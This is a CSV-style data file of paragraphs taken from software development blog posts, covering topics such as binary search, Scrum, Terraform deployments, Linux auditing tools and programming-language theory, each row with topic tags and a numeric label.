403,"For simplicity reasons, lets assume we are given an array of 8 number of elements and the one we need to search happens to be at the last index (worst case situation). So each time, we divide our array by half until we have only one element left, that is: If we refactor: For n elements, lets refactor: Lets put it in logarithmic form since we need k: And thats why the worst-case run-time complexity for binary search is O(log n). The most amazing thing about binary search is that, every time the size of the array doubles, the number of run time guesses only increases by 1 only! By intuition, we usually use linear search, right? But now we know binary search can be so efficient, especially for a big problem So, as a developer, how do we debug? Toconclude, I want to quote Dan Abramov: Use binary search and scientific method. Not literally in the code, but in how you approach it. Have a bug somewhere between callsites A and B? Put a log in the middle. Its between A and the midpoint? Put another log in the middle. Debugging can feel very arbitrary but its straightforward when you do it mechanically. Observe, form a hypothesis, come up with a way to test it, repeat. And cut things in half when there are too many.","['Algorithms', 'Binary Search', 'Programming']",3
404,"In theory this is a simple rule, but in practice it can get relatively complicated. For example: if you pull some commonly used functionality into a new set of utilities, how should you go through all the modules that depend on that functionality and deal with the collected effects of your changes? In complex systems, doing one thing at a time takes some thought. The first few projects where I worked on refactoring I found I was inclined was to jump from improvement to improvement as opportunities became apparent. This ended up increasing the complexity of the task until I was basically just covering up my own mistakes instead of adding meaning. It takes some discipline to identify new opportunities to improve the code base, but not to immediately act on them. You may still get everything to work by following the path of greatest convenience, but the point of refactoring is improving order and maintainability. This is much more likely to happen when following a focused, directed approach.","['Software Development', 'Refactoring', 'Testing', 'Programming', 'Coding']",9
405,"In SCRUM, we have roles of a product owner, a scrum master, and developers. The product manager of the theme-based team will take the role of product owner. Any team members that are experienced enough can be voted to be scrum master. We will have IOS developers, Android developers, web developers, backend developers, QAs, designers, product managers, data analysts sitting in each team. The team should be small enough that they can be flexible and efficient but big enough that it can develop most, if not all of its own features.","['Agile', 'Scrum', 'Startup', 'Organizational Change', 'Scalability']",0
406,"For years, there are a lot of debates on how UX designers, data scientists, and other non-developers can fit into the scrum process. The reason why this is hard is that there is no rule that plays wells in every situation. Every sprint may require different levels of involvements from these parties. Lets say if the sprint goal is to develop a new UI for the IOS application, the team may require designers to have prepared for the wireframes and mockups before the sprint starts. During the sprint, the designers need to stand by and answer questions raised by developers and product owners. In another sprint of which the goal is to make the data-driven dispatch service more efficient, we may require much help from data scientist, while requiring no service from designers.","['Agile', 'Scrum', 'Startup', 'Organizational Change', 'Scalability']",1
407,"Every so often, role-based managers may have tasks that require help from individual members across the teams. It could be about global standards, coding styles, cross-theme architecture change etc. In this case, they should not assign tasks directly to developers. Instead, they should talk to product owners and work with them to figure out the priority. Product managers care more about features. Tech leads focus more on tech debt. We can strike the balance enforcing 80/20 rule. 80 percent of the tasks will be features and 20 percent of the tasks would be technical stories. The divide here may not apply to all companies. Actually, it is up to the team to figure out what the priority is. For early-stage startups that are fighting for survival, they may put more weight on feature developments instead of technical debts. For late-stage or established companies that seek scalability and maintainability, they may focus more on technical debt.","['Agile', 'Scrum', 'Startup', 'Organizational Change', 'Scalability']",0
408,"Some companies will put architects inside each theme team. There are a few limitations to this. Secondly, architects may not have enough work to do if they are dedicated to one single team. So its common that some companies will have architects as consultants for the sprint team. In GOGOVAN, we want architects to play more active roles. Architects will participate in sprint grooming sessions, analyzing the stories and coming up with architecture blueprints with developers. During the sprint, the development teams can pull in architects if they have any questions. After the sprint, architects need to evaluate the implementations and see if everything is alright.","['Agile', 'Scrum', 'Startup', 'Organizational Change', 'Scalability']",1
409,"But theres a whole lot of websites. According to this statistic, there are about two billion websites online as of today. How do we know that Grammarly works great on every website unless we test all of them? And how do we know that, once we do get Grammarly working on a website, the website wont suddenly change, undoing all our hard work? Every website is different, so a one-size-fits-all solution is infeasible. Some sites use plain <textarea /> or <div contenteditable=true /> fields, some use one of the popular open-source rich text editors like D __url__ or Quill.js, some even build their own proprietary text editing engines. And every website has its own unique layout and style.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",19
410,"The biggest challenge in improving the compatibility of the Grammarly extension has always been rendering our signature underlines. Not only is it the hardest part to implement, but its also the core functionality. Theres no public API for native browser underlines, which are used by the built-in spell checker. So, we have to implement our own. Consider this simple contenteditable text field: The source HTML is straightforward: When you run Grammarly in that field, it will find a couple of mistakes in the text and underline them. But whats happening in the DOM? Not as nice anymore, even though it gets the job done.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",19
411,"This seems to work well, and it does in many cases, but there are several issues with this approach. First, by mixing text and underlines, we pollute the text field content. The text field is supposed to only contain actual text, and most of the code running on the web expects that to be the caseand rightly so. If Grammarly doesnt remove the extraneous underline nodes before the websites code can notice them, it can corrupt the users text, crash the websites code, or make an email include underlines when it gets sent. And most of the time, theres no way to know when precisely the underlines should be removed.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",19
412,"It turns out its not very hard to create a simple proof of concept. Suppose we want to render the underline elements outside of the text field and make no changes to the field itself. This means the underlines will have to go on top of it. For this to happen, we need to know the exact position where each underline should land. This can be achieved with the Range.get Client Rects() API. This method allows you to get a list of rectangles that a certain range of text takes up on the screen.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",15
413,"Weve used Range.get Client Rects() to get coordinates for our underlinesits also on the list of calls that cause layout/reflow. And unfortunately, we have to use it a lot: once for each underline fragment of the text every time the text content, text fields position, size, or style changes. So if there are a lot of underlined words, it can result in a significant performance drop. It is especially noticeable with scroll events: users expect scrolling to be smooth. But if we force layout with these calls in the scroll event handler, theres no way it will be smooth.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",19
414,"My last point on this topic is about profiling and keeping an eye on performance. If you typically work on a high-end computer (like many developers do), you might not even notice any performance issues with your software. The problems might surface only when your code is run by an average user whos running average hardware. But if were only detecting performance issues when a user experiences them, then its too late. Luckily, modern browsers come with a lot of powerful performance profiling tools, including CPU throttling. I found it to be very helpful, especially during early development, when many architectural decisions are made.","['Programming', 'Browser Extension', 'JavaScript', 'Web Development']",13
415,"Programming languages are all more or less Turing equivalent, but remain religiously debated amongst software developers. This dogmatism arises for several reasons; languages represent different design philosophies. Language communities also create different cultures, offering varying levels of social support that color a developers opinion. In spite of the parochialismit is difficult to discern what makes one language good over another. Here are some factors that have traditionally influenced mindshare, perceptions, and adoption: Expressiveness. Language features and abstraction facilities influence a programmers ability to write concise, maintainable code. Programming is, after all, a communication tool.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
416,Making source code freely available means it can be used by and improved upon by anyone. This allows source code to be customized and adapted by a wider range of people. This allows it to be ported to different architectures (e.g. Gos Windows port was entirely community driven). Unix is known as the worlds most portable operating system. C was developed in conjunction with Unix (and happens to be the language Linux is also written in).,"['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",16
417,"Ada was backed by the Department of Defense. The explosive growth and survival of many languages have benefited from powerful sponsors. New and better languages continue to spring into existence. However, we tend to lean toward the devils we know because it is non-trivial to replace an existing large code base and programmer expertise.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",16
418,Having a language that is easily ported allows developers to become productive quickly. C is a good example of a language that required minimal modifications across platforms. Niklaus Wirth created Pascal to work reliably and quickly on 1970s machines and shipped it for free to all of the worlds universities. Basic was easy to run on small machines. These languages were straightforward to implement and required little computing power.,"['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
419,"Scaling large projects depends on more than a language in isolation. Code-writing is aided by interpreters, compilers, linkers, assemblers, debuggers, preprocessors, editors and a host of other tooling. Powerful development environments contribute to a fluid programming experience. Common Lisp benefited from great compilers and supporting tools. Visual Studio is a good example of an editor that works with syntactic knowledge of C# to provide capabilities to cross-reference or locate definitions.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
420,"Introspecting upon what is better opens up several questions. For example, how much time and energy should be devoted to writing efficient code? What proportion of the busywork should be abstracted away from the developer and passed on to the computer, verses remain in control of the engineer? How much direct access to machine memory should be provided? How easily can a feature be implemented, and how will the choice of various features impact performance? As engineers and computer scientists, we evaluate these trade-offsbut often do so with sub-optimal processes and inadequate information.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",12
421,"This property defines the criteria necessary for being considered a real programming language. A programming language is a formal language defined by a set of rules used to translate instructions to a computer. These rules specify what is and isnt an acceptable way to communicate with a computer. The Turing machine is a mathematical model of an abstract computer capable of implementing any algorithm by simulating its logic. When a system that can simulate the Turing machine can also implement any algorithmit is known as Turing complete. This usually requires the language to be able to possess state (ie., variables) and conditional logic. By this definition, HTML is not Turing completebut lambda calculus is.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
422,"This is a strand of mathematics underlying type systems in programming languages. It forms the internal logic for type checking algorithms in compilers. A type theoretic framework allows us to evaluate and computationally justify why certain types should or should not exist in a strongly typed language. Types are one way of defining interfaces between different parts of a language, and ensuring the program is connected in a consistent way. In a functional programming sense, type theory suggests that types should express what the programming language is to do (and the lambda calculus that materializes from these types is the language itself). This means that being acquainted with some type theory provides the foundation to better understand static languages with rich type systems (ex., Haskell). Type theory essentially studies type systems, which define a languages organizing rules. An interesting type system is the Hindley-Milner Type System which uses unification to provide type inference capabilities for untyped syntax.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
423,"These sets have operations (such as intersection, union and complement). According to formal language theory, a language is a set of strings. Data structures themselves can also be seen as sets with various implementations of set operations. One clear way set theory is notionally relevant to programming is through relational databases (where a database is a relation over sets).","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",8
424,"Category theory generalizes several branches of mathematics. It does so by providing a generic meta language to be able to model concepts abstractly. This is profoundly useful because it allows us to reason about a network of relationships, instead of being concerned with the details of a system. A category is a collection of objects. The relations between these objects (such as composition or associativity) are known as morphisms. Relationships between categories are known as functors. Several concepts described by category theory are used in computer science to assess the correctness and concision of programs. Category theoretical concepts are more visible in pure functional paradigms, where computation comprises of mathematical functions that can be composed to build complexity.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",5
425,"As demonstrated, the success of programming languages is unrelated to a consistent set of principles or standards for technical correctness. Social inertia, human subjectivity and economics have influenced the way we build programs today. The history of computer science has produced abstraction upon abstraction, meaning most modern developers can remain blissfully unacquainted with the details conveniently hidden away behind a languages interface. However, poorly designed, opaque abstractions lead to a murky understanding of internal logic and structural properties. Many languages are also built on flimsy theoretical foundations. Familiarity with theoretical underpinnings can help developers become better diagnosticians, architects and engage in deeper technical work.","['Programming', 'Programming Languages', 'Plt', 'Code', 'Software Development']",9
426,"It helps if you forget about the purely functional definition of software as an end product. Instead, consider programming as a process. An architect may ultimately produce blueprintsbut to arrive at them, she must consider space, harmony, light, materials, purpose, and environment. The blueprints, as unflinchingly technical and mathematically precise as they may be, are the result of a deeply creative process. In the same fashion, programming is not really the practice of writing lines of code. It is the art of taking big, intractable problems and breaking them down into ever-smaller ones which can be understood, explained, and then carefully assembled into a living, breathing work of art.",[''],12
427,"In fact, they can be pretty boring. Yet, we keep having to repeat implementing the same stuff over and over again because the context in which we build things keeps changing. But should it really matter that much whether were running client- or server-side, on Postgre SQL, Mongo DB or Firebase, using microservices, monoliths or Lambda functions? In the end, we still have to solve the same problems, albeit in different configurations. I dont know about you, but Im getting pretty tired having to keep thinking about schema migrations, REST APIs, live migrations of data, conflict resolution for offline-first applications synced between multiple devices, access control and all of these things we keep solving over and over throughout the years.","['JavaScript', 'Serverless', 'Database', 'Software Engineering', 'Decentralization']",10
428,"From this flows that Storex is not a framework, but a library: re-usable, very loosely coupled packages that can be recombined. It doesnt include an Active Record pattern implementation, even though one could be built on top of it (which I highly advise against, since Active Record encourages mixing of business logic with storage logic. )What does this look like in practice? Lets start from an example: What we do is to define the schema of your data and the relationships between them in a graph-like way (using child Of, single Child Of and connects, see more in the docs.) Then we can do different read/write operations on the database which gets delegated to the backend who can translate it into lower-level idiomatic ways to deal with the underlying database. (In this case the backend is Indexed DB through Dexie client-side, but a Sequelize backend for talking to SQL database server-side is also available. You can contribute to a Firebase backend here.) The idea is that each back-end (and plugins) can implement their own specific namespaced operations, while the ones that can be shared among a wide variety of different databases (create Object, transaction, etc.) Theres a standard feature detection mechanism so your code can detect automatically whether your code can run on top of a new back-end, or adapt to different feature sets (direct full-text search, or needing an external full-text search database for example.) And if all else fails, each database allows you to access the lower-level connection directly.","['JavaScript', 'Serverless', 'Database', 'Software Engineering', 'Decentralization']",8
429,"One of these problems is schema migrations. Apart from SQL abstraction layers, every technology out there seems to have its own solution. Wouldnt it be great if we could just describe how a migration should done and have things be modular enough so we can execute it with one line of code, generate an SQL script, generate a Firebase function, or maybe even use this to transform data imported from a file or received over the network? Its divided into a few sub-packages that calculate the difference between two schemas, generate a migration, and can execute it. However, you can take this generated migration yourself, so you can translate it to an SQL script to hand to a DBA, or do other things with it. Or use the schema diff yourself to visualize your schema changes. Or maybe you want to apply them to your unit test fixtures so you dont have to update them by hand all the time.","['JavaScript', 'Serverless', 'Database', 'Software Engineering', 'Decentralization']",8
430,"You may know what Terraform is, but what is AWS ECS? It is a container orchestration platform, where you declare the Docker containers you want to run, and ECS figures out the best way to run them for you. It bares resemblance to Terraform in that you declare what you want and ECS takes care of making it happen. While there is a lot more to ECS, for the purpose of this post, what we need to know about ECS is that it allows us to define the containers we want to run (i.e. an ECS Task) and how to run them (i.e. If you are using Kubernetes, you may be able to mentally translate this post by thinking about Kubernetes pods and services instead.","['Terraform', 'AWS', 'Deployment', 'Docker', 'Aws Ecs']",7
431,"For the most part, its easy to use Terraform and ECS together to get up and running. There is plenty of documentation and examples to replicate. However, it becomes challenging when you want more granular control over how your infrastructure and containers come into existence. There are scenarios where you do not simply want to declare your needs, but you want to specify how to fulfill your needs. This is particularly relevant for stateful services. For example: When provisioning a database, you may want to run a seed script to set up the initial table definitions, stored procedures, etc. so that the database is ready from the start for your applications logic.","['Terraform', 'AWS', 'Deployment', 'Docker', 'Aws Ecs']",8
432,"An important trait of Terraforms execution is how it creates a Resource Graph to perform its work. Citing from the introduction: This graph is what allows us to simply declare what we want provisioned and let Terraform take care of it. By default, Terraform parallelizes whatever it can, unless there is a dependency that prevents it from doing so. Thus, to control Terraforms execution order, we need to think about the underlying dependency graph. With the appropriate dependency setup, we can do tasks in parallel or in sequence. To explicitly define sequential dependencies, you can use the depends_on property available to all Terraform resources. For example, by default the following three resources will be created in parallel: However, we can create them sequentially if we configure the depends_on property appropriately: Youre probably starting to see the solution now for how we can deploy updates to stateful services using Terraform: use null_resources with the appropriate depends_on dependencies to have sequential execution for key steps. In particular: Define new containers to be deployed (i.e. update your aws_ecs_task_definition resources)Update the database schema, if necessary (i.e. run null_resource with your schema update script, with a depends_on on the aws_ecs_task_definition of step #1)Deploy the new containers (i.e. update aws_ecs_service to use your new containers from step #1, with a depends_on on the null_resource from step #2)This ensures our database schema is up-to-date before the new code is deployed. Were getting close, but something is missing. For a reasonably sophisticated service, you do not want to execute terraform apply on everything during a code deployment. For example, your Terraform logic may set up DNS entries, set up Redis, set up load balancers, etc. which you do not want touched during a code deployment. Itd be too much change at once, itd mix together infrequently changed resources (e.g. DNS) with frequently changed resources (e.g. application logic), and itd require your CD to have a large set of permissions. To reduce that scope, we need to use another feature: Terraforms ability to -target executions.","['Terraform', 'AWS', 'Deployment', 'Docker', 'Aws Ecs']",8
433,"We had long used this when we wanted to target a single resource; however, this was not viable when we needed to deploy groups of resources at the same time (e.g. ECS Task, ECS Service, null_resource, etc.). Fortunately, we realized we can aggregate many targets into one by combining null_resource and depends_on together. For example: Thus when we can execute terraform apply -target=null_resource.deployment, due to the Resource Graph related to this resource, it updates all associated deployment resources as well. In this example, it makes sure to update only our aws_ecs_task_definition, aws_ecs_service, and run any schema updates via null_resource.migrate. Using a targeted resource, we felt comfortable getting our CD to apply Terraform without risking any unexpected changes taking place.","['Terraform', 'AWS', 'Deployment', 'Docker', 'Aws Ecs']",10
434,"Still, you might like a good challenge. Someone had really made changes on a production server. They may be easy to fix, but still you wonder about transparency of whos doing what there. Havent even touched security aspect yet, mind you. All of this takes time and focus. Just as if youd enter a pitch black cave merely with a flashlight. Youre in the dark and illuminate only there where your attention (thus flashlight) goes. And just like having some sort of ultrasonic scanner in a dark cave which would enable you to map it quicker than a flashlight, it would make sense to have a mapped out story of what was going inside your own digital cave of infrastructure. It would greatly shorten time to resolution, it could better your mean time to repair (MTTR) and lessen headaches of this toil for you and your colleagues. You could even graph actions that led to an issue/failure/outage.","['DevOps', 'Linux', 'Elasticsearch']",13
435,"We all have limited time, so I have few factors of consideration for the tools:easiness of setupeffectiveness/flexibility of the toolintegration with log aggregation and visualisation toolsstat is a nice tool when checking out file statistics, but theres still ways to bypass its truthfulness. For example, it may show information about time of a files last change, but not user that changed it. What Ive also noticed is that stat shows me virtually the same timestamp: When I modify this file as root with Vim, this is new output of stat: Check the inodeits changed. This means that write and quit operations result in a new file. On the other hand, when a shared user account is used (as is the case with our client), it gets more complicated to pinpoint exact user behind a change. Stat is nice and easy, but its lacking information we need.","['DevOps', 'Linux', 'Elasticsearch']",3
436,"It talks about native GO auditing program which communicates with kernel through netlink is scalable and has good performance. So I decided to check it out, hands-on: Moved the binary to the server and tried to start it: Havent read the docs well enough; I needed to check Rsyslogd version (min 8.20). The version on server was 7.4.4. I upgraded Rsyslog and installed other dependencies as instructed here. Then I had to tamper with Rsyslog files, which Ive done hastily while saving backup configurations.","['DevOps', 'Linux', 'Elasticsearch']",7
437,"Linux Audit System was the first one to answer and it did its job well. However, nowadays we need easier, quicker approach to aggregating these events and showing them up quickly, on demand. Auditbeat builds on top of Linux Audit System, integrates smoothly with rest of ELK stack and even with most basic default settings it works right out of the box. It is a well documented project, once you get used to Elastic documentation. Go-Audit took another course, it is probably a good open-source project and it has its documentation written on Github pages. I found it more tedious to get it working, technological dependencies force a person to go out of their way and digress multiple times to get the whole thing working and franklythis project lost me because of it.","['DevOps', 'Linux', 'Elasticsearch']",10
438,"Three years later, I did the same thing: No Oracle experience? Heres a big pay raise and a Oracle Applications Developer title. Within a month, I was doing the work of their Senior developer. Thats what a person with even a basic computer science background and some solid programming experience can dolearn quickly. In my current role, because the stakes are so low, I distinguish myself only because of my ability to lead and my experience with problems so that I can anticipate what might go wrong, not in developmenta programmer with 4 years of experience on the team knows enough tech to keep up with me on the only tech challenges in the project. (Really, employers, we can learn your stack quickly, even folks new to the field.) Good software engineers adapt, even ones with little professional experience, and in 1998 the market understood that.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
439,"I had been programming since I was 9. I was self-taught prior to the prevalence of computer books and the internet on an Apple II+ and an Apple IIe, with Applesoft BASIC and Logo. My dad wasnt an engineer, but, in 85, he suspected computers were going to be big, so he spent too much money for his meager teaching salary to buy the family Apple products. (My mom had been told by her family they wouldnt pay anything towards a college degree, as she was a woman. They paid for my uncles college degree, a guy I still love despite his multiple prison-stints, his failed marriages, his kids out of wedlock, his drug addictions, and, ultimately, an inability to find work now in the field in which my moms parents paid for his college degree. )Then, right before college, I got a PC, and I taught myself Turbo Pascal. With Pascal, I had a chance to teach students more senior than I how to finish their homework.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
440,"We might have regained jobs, but they have been Uberized, outsourced, and H1B-visad into pale remnants of what they used to be. Companies, under the guise of reducing costs by outsourcing and by using H1B-visa labor, are actively engaging in wage theft, which erodes the earnings of my industry while it abuses the lives of the foreign nationals it affects directly. I have watched as my friends and colleagues in India and who held H1B visas were asked to work ridiculous hours, destroying their work-life balance as it eroded the overall prestige and earnings for the entire industry. We Americans think weve got it tough when our jobs get outsourced? But try being someone whose visa depends on employment with one firm, a firm which asks you to work 14 hour days every day. Imagine being an Indian employee who is asked to go into the office every day, whose only bus in runs at 7am and whose only bus out runs at 9pm. We Americans, losing our jobs to corporations hungry for cheaper labor, are unlucky, but not like that.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
441,"Four and a half long years later, I left that company earning less than I had in South Carolina, but with a much steeper average rent profile [double the rent for a Dickensian apartment!]. I had witnessed first hand the devastating effects of wage theft, of visa abuses, of how labor in India was being exploited to reduce costs for owners at the expense of developers like me. The company didnt want to teach me new things: they could hire freshly minted graduates for that at a fraction of my cost, especially graduates from other countries. The company didnt want to take its experienced Oracle developers and teach them relevant skill setsit could acquire small firms to obtain those skills. It was only at the end that I got a shot to learn Salesforce.com, programming in Apex, which I considered relevant. That was when I made my escape to a new firm. Prior to that, every year, my Dice, Indeed, and Monster searches were yielding fewer and fewer hits for Oracle developer, and the interviews were more competitive, yet for salaries which were not themselves increasing.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
442,"*I refer to Oracle development work as commoditized now. However, my new job involves very little actual development. Im mostly working on an in-house data warehouse whose proprietary systems will not help me grow my skill set, or even maintain my current skill set. On-the-job learning and effort does not combat the lack of relevance I found during my job search. *Had I ever had a job search like the 2017 job search?","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
443,"My percentage of responses to resume submissions went from about 100% out of college, to about 100% for my second job in 1996, to about 50% in 2012, to approximately 20% in 2017. I was assured this was a good percent, an enviable one, from other developers out of work. See, programming is no country for old men or women. The kicker was when a person my age, a programmer, killed himself in Spy Pond, near where I rent an apartment now. It is an apartment I would have never considered living in prior [steam heat I cant control, 1950s furnishings, a Dickensian management team] for a price well above my SC mortgage on a 2500 sq. There are older software developers I know, a lot of them, living on unemployment, searching jobs far and wide now. Their pedigrees should earn them jobs in management or in tech they would need to come up-to-speed in quickly, but the relevant experience part of their resumes use words like Perl, or C, or database developer which no longer find footing in todays job market.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
444,"But Im also exhausting myself 3 nights out of the week and on weekends learning: Kotlin, Javascript, Node.js, Django, Python. I go to meetups and make contacts. Im striving, but I am tech debt. There was an album by a record label called Lonely is an Eyesore. It has on it a track by a band I loved in the late nineties: The Dead Can Dance performing The Protagonist. Anyone listen to the Dead Can Dance any more? Well, tech debt is an eyesore. I cant help the people I meet: either as colleagues, or as a future employee [unless theyre willing to be patient as I learn for a month], or to teach them the skills they are going to meetups to learn. I cant turn the other folks like me there, desperately seeking relevance, into machine learning experts or data science gurus, designers of AR, or wave a wand and give them the full stack knowledge which makes them just perfect for that one job which is looking for that particular full stack: a complicated lock seeing a very specific key.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
445,"Sure, people are friendly and helpful. I love being around folks who get who I am, or at least my personality. It is exhausting, but Im trying to pay my way out of technical debt by ruining personal relationships and sacrificing work-life balance to learn programming languages which hopefully will help me catch up to recent college grads, at least in the eyes of hiring managers and HR departments intent on getting top talent for the best, most affordable price. *Now, I have over 10 years of non-career oriented programming experience [before the end of college, including student jobs and self-taught hours]. I also have over 21 years of professional, career-oriented software development experience. Combined, I have been either teaching myself to program and working pre-career jobs, or have been working career software development jobs, for over three decades. Im an accomplished team and project lead, yet I dont get call backs on resume submissions to companies looking for professional or academic experience in the languages I only have taught myself in.","['Tech Debt', 'Software Engineering', 'Software Development', 'Employment', 'Corporate Culture']",2
446,"Have you ever been at this retrospective: The team gets together, write up some post-its on what was good/bad in the last Sprint. Vote on which ones of the bad ones to do something about. Agree that those are the things we will fix, and then at the next Retrospective no one can remember, what we actually agreed to do something about. Then we start over and do the exact same again. This creates Retrospectives that are just long meetings. Where people are frustrated and do whatever they can to avoid participating.","['Agile', 'Retrospectives', 'Scrum', 'Agile Coaching']",1
447,"For me this is the number one Retrospective killer. I have seen it so many times, that teams forget to actually do something about what they decided last Retrospective. If we do not follow up on it, we will never know if we actually completed anything. When we do not achieve any of the improvements we agreed on. The Retrospective is just a waste of time. I have seen a lot of teams being discouraged by this.","['Agile', 'Retrospectives', 'Scrum', 'Agile Coaching']",1
448,"I usually force teams to go through this very rigid. What do we want to do something about? With a focus on making the action items very actionable. We should know if it is done or not when we do the Look Back in the next Retrospective. Make sure every action item has a name of the person who will take the lead on it. It does not have to be that person who does the effort, but he/she should make sure it is done during the sprint. The action could also be to add something to our Definition of Ready/Done.","['Agile', 'Retrospectives', 'Scrum', 'Agile Coaching']",1
449,"But being able to ship changes in fast cycles isnt enough. One of the hardest parts of building software, is to make good decisions about what to build and how it can solve the users problem. In our fast moving world, customers are no longer willing to accept software products and services that they dont understand or that are hard to use. They demand solutions that are specifically tailored to their needs and that allow them to get a job done as fast as possible. As a consequence, a great User Experience (UX) has become one of the primary market differentiators and a crucial success factor for software products. Everyone is now talking about frameworks like Design Thinking and Lean UX and companies are hiring more and more UX designers to make their products more intuitive and useful.","['Design Sprint', 'Scrum', 'Agile', 'Design Thinking', 'Customer Centricity']",12
450,"But there is one big problem. Scrum and other agile frameworks lack specific practices to systematically integrate design activities into the development process. As a result, design and development are often handled as two very separate activities that follow their own processes and are performed by independent teams. Designers are not fully integrated members of the Scrum team, but often take the role of consultants or service providers that support the developers with design decisions. In order to continue to build great products, Scrum teams need to become more design-driven and find new ways how they can systematically build solutions that solve the right problems.","['Design Sprint', 'Scrum', 'Agile', 'Design Thinking', 'Customer Centricity']",12
451,"So the real deal of Design Sprints when used within Scrum, is that they help you create backlogs that are not just a flat representation of everything a team has to get done. Instead, they help you to view your user stories and backlog within the context of the user and answer questions like: Why are we building this? Who are we building it for? What value will the solution provide for the customer and when? When understanding the above, using Design Sprints within Scrum becomes pretty straightforward. Basically the process works like this: Run a Design Sprint. Set your challenge, gather the team and run a Design Sprint. When should you run the Sprint? There are many cases where a Design Sprint can be helpful in a Scrum project and also many where they are just overkill. I will explore this in greater detail in the next section.","['Design Sprint', 'Scrum', 'Agile', 'Design Thinking', 'Customer Centricity']",1
452,"Now that you know how Design Sprints fit into Scrum, lets take a closer look at when its best to run a Design Sprint in a Scrum project. Theoretically you could benefit from running a Design Sprint every time you plan to implement something new. However, a Design Sprint is quite an investment, occupying more than a handful of people for a whole week. Therefore it will make no sense to run a Design Sprint for each and every new piece you are planning to build. A Design Sprint is best, when you are faced with something complex and risky, that arises many open questions that focuses on the general desirability of a feature. If your problem is more about optimization and the perfect usability, running a Design Sprint will often be complete overkill.","['Design Sprint', 'Scrum', 'Agile', 'Design Thinking', 'Customer Centricity']",1
453,"So, if you are a member of a Scrum team and want to benefit from Design Sprints, how should you get started? Try to find some high-value, low-risk opportunities and give Design Sprints a try. Maybe you start a new project soon? Maybe your team has some big feature coming up? Or maybe you need to groom your backlog to get back the big picture? Whatever the challenge might be, gather a team of volunteers and just get started. The Design Sprint is one of these things that you have to experience to really understand the power and beauty of it.","['Design Sprint', 'Scrum', 'Agile', 'Design Thinking', 'Customer Centricity']",1
454,"What if we go on and recall the storage architecture in modern DBMSs? Lets be honest, no one stores data in tables. DBMS developers typically use variations of the B-tree (in Postgre SQL, for example) or, far less often, dictionary-based storage. On the other side of the barricade, developers using DBMSs for storing data do not work with tables either. And it makes developers constantly bridge the semantic gap using a cumbersome intermediate data layer. And by doing so, cause an internal dichotomy, system-wide discomfort and debugging sleeplessness.","['Python', 'Programming', 'Objectscript', 'Intersystems', 'Data Base Management']",8
455,"All of these bag of bytes twists and turns have a pleasant exception Inter Systems Cach DBMS (now the Inter Systems IRIS data platform as well). It may be the only DBMS in the world that doesnt hide the obvious from developers and takes it even further by saving them the trouble of thinking about storing all this stuff the right way. Suffice it to say that the class extends the Persistent metaclass and its in the bagor, rather, in globals(dont confuse them with global variables! )You can store all types of data, including character and binary streams. Here is the simplest example: Whats truly remarkable is that you can access stored objects not just via Object Script that is native for Cach but can also retrieve and save them directly in your programs written in Python, Java, Java Script, C++, C#, Perl. :)retrieve information from these objects directly using SQL queries, as well as call your own methods. To be precise, methods in this case automatically (with a little help of Sql Proc) turn into stored procedures. The Cach DBMS has all this magic under the hood.","['Python', 'Programming', 'Objectscript', 'Intersystems', 'Data Base Management']",3
456,"Lets try to create a couple of associated objects and work with them in Object Script and Python. Integration with other languages is implemented in a very similar manner. Python was chosen on the grounds of its maximum kinship to Object Scriptboth languages are script languages supporting OOP and lacking strong typing:)To get some ideas, lets turn our sights to the popular Framework Weekend projects in Khabarovsk. The sample source code is available here: __url__ below.","['Python', 'Programming', 'Objectscript', 'Intersystems', 'Data Base Management']",15
457,"We use different AWS accounts as isolated stages. The left side describes the infrastructure which all of our clients are using (account #1). Its a Cloudfront Distribution and a S3 Bucket as the origin (crazy, nah? The right side describes our deployment infrastructure (account #2). This makes our deployment a bit more complex, so let me summarize whats happening: every time a release is triggered an artifact (zip file) is build by our Gitlab instance and pushed to an artifact S3 Bucket. The Code Pipeline in the target account reacts to this uploaded artifact and uploads the content (via Code Build) to the S3 Bucket which will be used by Coudfront to serve requests. This process becomes more interesting a bit later.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",11
458,"As mentioned earlier P __url__ gives us a little starter project for a Cloudfront integration. It deploys two Lambdas, one will be used later by Cloudfront as Viewer-Request Lambda and one as Origin-Request Lambda. This setup enables us to integrate P __url__ transparently into our existing stack. Lets have a look: Client requests will flow through the Viewer-Request Lambda. This Lambda sets some headers (e.g. user-agent or host which would otherwise have been lost) and rewrites non-file requests to /index.html. What I mean by this is you get History API enabled routing for free without the need to setup a custom error response. This does not change the Cloudfront cache key, which allows us to cache paths like /about and /company even if they are backed by the same index.html. Next, the Cloudfront checks for a cache entry. In case of a cache hit it returns the cached entry. In case of a cache miss it forwards the request to the Origin-Request Lambda, which will instrument P __url__ to prerender the page. If prerendering takes place P __url__ will request the same URL, but this time all Lambdas know (by inspecting the user-agent of the requesting cloud service) that it shouldnt be prerendered and S3 is the origin that delivers the content.","['AWS', 'Prerender', 'First Post', 'React', 'Web Development']",11
